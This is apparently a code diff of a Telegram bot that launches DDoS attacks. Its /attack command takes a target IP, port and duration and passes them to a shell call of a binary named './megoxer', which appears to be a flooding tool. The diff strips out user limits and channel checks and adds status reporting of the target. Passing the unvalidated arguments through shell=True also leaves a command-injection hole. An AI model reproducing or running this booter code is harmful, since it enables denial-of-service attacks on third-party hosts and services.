@@ -23,54 +23,19 @@ ATTACK_LIMIT = 10  # Max attacks per day
 # Global attack tracker
 is_attack_running = False  # Track if an attack is running
 attack_end_time = None  # Store attack end time
+attack_target = None  # Store attack target IP
+attack_port = None  # Store attack port
+attack_duration = None  # Store attack duration
 pending_feedback = {}  # Users who need to send screenshots
-
-# File to store user data
-USER_FILE = "users.txt"
-
-# Load user data
-user_data = {}
-
-def load_users():
-    try:
-        with open(USER_FILE, "r") as file:
-            for line in file:
-                user_id, attacks, last_reset = line.strip().split(',')
-                user_data[user_id] = {
-                    'attacks': int(attacks),
-                    'last_reset': datetime.datetime.fromisoformat(last_reset)
-                }
-    except FileNotFoundError:
-        pass
-
-def save_users():
-    with open(USER_FILE, "w") as file:
-        for user_id, data in user_data.items():
-            file.write(f"{user_id},{data['attacks']},{data['last_reset'].isoformat()}\n")
-
-def is_user_in_channel(user_id):
-    try:
-        member = bot.get_chat_member(CHANNEL_USERNAME, user_id)
-        return member.status in ['member', 'administrator', 'creator']
-    except:
-        return False
 
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
-    global is_attack_running, attack_end_time
+    global is_attack_running, attack_end_time, attack_target, attack_port, attack_duration
     user_id = str(message.from_user.id)
     command = message.text.split()
 
     if message.chat.id != int(GROUP_ID):
         bot.reply_to(message, "🚫 **𝐘𝐄 𝐁𝐎𝐓 𝐒𝐈𝐑𝐅 𝐆𝐑𝐎𝐔𝐏 𝐌𝐄 𝐂𝐇𝐀𝐋𝐄𝐆𝐀** ❌")
-        return
-
-    if not is_user_in_channel(user_id):
-        bot.reply_to(message, f"❗ **𝐂𝐇𝐀𝐍𝐍𝐄𝐋 𝐉𝐎𝐈𝐍 𝐊𝐑𝐎 𝐏𝐄𝐇𝐋𝐄** {CHANNEL_USERNAME} 🔥")
-        return
-
-    if pending_feedback.get(user_id, False):
-        bot.reply_to(message, "😡 **𝐒𝐂𝐑𝐄𝐄𝐍𝐒𝐇𝐎𝐓 𝐃𝐄 𝐏𝐄𝐇𝐋𝐄!** 🔥")
         return
 
     if is_attack_running:
@@ -81,28 +46,28 @@ def handle_attack(message):
         bot.reply_to(message, "⚠️ **𝐔𝐒𝐀𝐆𝐄:** /attack `<IP>` `<PORT>` `<TIME>`")
         return
 
-    target, port, time_duration = command[1], command[2], command[3]
+    attack_target, attack_port, attack_duration = command[1], command[2], command[3]
 
     try:
-        port = int(port)
-        time_duration = int(time_duration)
+        attack_port = int(attack_port)
+        attack_duration = int(attack_duration)
     except ValueError:
         bot.reply_to(message, "❌ **𝐏𝐎𝐑𝐓 𝐀𝐍𝐃 𝐓𝐈𝐌𝐄 𝐌𝐔𝐒𝐓 𝐁𝐄 𝐈𝐍𝐓𝐄𝐆𝐄𝐑𝐒!**")
         return
 
-    if time_duration > 180:
+    if attack_duration > 180:
         bot.reply_to(message, "🚫 **𝐌𝐀𝐗 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 = 180𝐬!**")
         return
 
     # Mark attack as running
     is_attack_running = True
-    attack_end_time = time.time() + time_duration  # Store attack end time
+    attack_end_time = time.time() + attack_duration  # Store attack end time
     pending_feedback[user_id] = True  # Require screenshot
 
-    bot.send_message(message.chat.id, f"🚀 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!**\n🎯 `{target} : {port}`\n⏳ {time_duration}s")
+    bot.send_message(message.chat.id, f"🚀 **𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃!**\n🎯 **Target:** `{attack_target}`\n🔹 **Port:** `{attack_port}`\n⏳ **Duration:** `{attack_duration}s`")
 
     try:
-        subprocess.run(f"./megoxer {target} {port} {time_duration} 900", shell=True, check=True)
+        subprocess.run(f"./megoxer {attack_target} {attack_port} {attack_duration} 900", shell=True, check=True)
     except subprocess.CalledProcessError as e:
         bot.reply_to(message, f"❌ **𝐄𝐑𝐑𝐎𝐑:** {e}")
         is_attack_running = False  # Reset flag
@@ -114,12 +79,12 @@ def handle_attack(message):
 
 @bot.message_handler(commands=['check'])
 def check_attack_status(message):
-    global is_attack_running, attack_end_time
+    global is_attack_running, attack_end_time, attack_target, attack_port, attack_duration
 
     if is_attack_running:
         remaining_time = int(attack_end_time - time.time())
         if remaining_time > 0:
-            bot.reply_to(message, f"⚡ **Attack is running!**\n⏳ **Time left:** {remaining_time} seconds")
+            bot.reply_to(message, f"⚡ **Attack is Running!**\n🎯 **Target:** `{attack_target}`\n🔹 **Port:** `{attack_port}`\n⏳ **Duration:** `{attack_duration}s`\n🕒 **Time Left:** `{remaining_time}s`")
         else:
             bot.reply_to(message, "✅ **No attack is currently running.**")
             is_attack_running = False
@@ -146,8 +111,6 @@ def welcome_start(message):
     response = f"🌟🔥 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐁𝐑𝐎 {user_name} 🔥🌟\n\n🚀 **𝐘𝐨𝐮'𝐫𝐞 𝐢𝐧 𝐓𝐡𝐞 𝐇𝐎𝐌𝐄 𝐨𝐟 𝐏𝐎𝐖𝐄𝐑!**"
     
     bot.reply_to(message, response, parse_mode="Markdown")
-
-load_users()
 
 while True:
     try:
